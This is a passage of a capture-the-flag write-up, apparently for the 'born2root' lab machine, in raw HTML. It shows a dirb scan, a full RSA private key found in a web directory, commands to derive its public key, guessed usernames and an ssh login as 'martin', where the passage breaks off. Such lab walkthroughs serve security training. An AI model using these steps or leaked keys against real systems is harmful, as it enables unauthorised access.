&lt;p&gt;&lt;img alt="Directory listing" src="/media/2017.11/born2root/4.png"&gt;&lt;/p&gt;
&lt;p&gt;We launch &lt;code&gt;dirb&lt;/code&gt; against the site:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dirb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;DIRB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="mf"&gt;.22&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;By&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dark&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Raver&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;START_TIME&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Tue&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;URL_BASE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;WORDLIST_FILES&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dirb&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;common&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;GENERATED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;WORDS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4612&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scanning&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;icons&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nl"&gt;CODE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="k"&gt;SIZE&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5651&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;manual&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;robots&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nl"&gt;CODE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="k"&gt;SIZE&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;57&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nl"&gt;CODE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;403&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="k"&gt;SIZE&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;296&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Entering&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;WARNING&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;IS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LISTABLE&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;need&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;Use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-w&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;want&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;anyway&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Entering&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;icons&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;WARNING&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;IS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LISTABLE&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;need&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;Use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-w&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;want&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;anyway&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Entering&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;manual&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;manual&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;da&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It found an interesting directory: &lt;code&gt;icons&lt;/code&gt; it contains a lot of icon and a file VDSoyuAXiO.txt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gh"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s"&gt;rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="gh"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This looks like an ssh private key. We extract the associated public key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openssl rsa -in .ssh/id_rsa -pubout -out key.pub&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we convert it to  ssh format:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh-keygen -f key.pub -i -mPKCS8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The we can copy the private key to &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; and the public key to &lt;code&gt;~/.ssh/id_rsa.pub&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But we have no idea of the associated user. We try the one listed on the site main page:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Martin N =&amp;gt; martin, martinn, nmartin&lt;/li&gt;
&lt;li&gt;Hadi M =&amp;gt; hadi, hadim, mhadi&lt;/li&gt;
&lt;li&gt;Jimmy S =&amp;gt; jimmy, jymmys, sjimmy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And we got a shell with the first one: martin. The server is asking us for a password, but we already got a shell. Entering anything will give use the focus and &lt;code&gt;CTRL-C&lt;/code&gt; it will give us a simple error message.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;kalili&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="c1"&gt;# ssh 10.0.2.5 -i .ssh/id_rsa -lmartin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
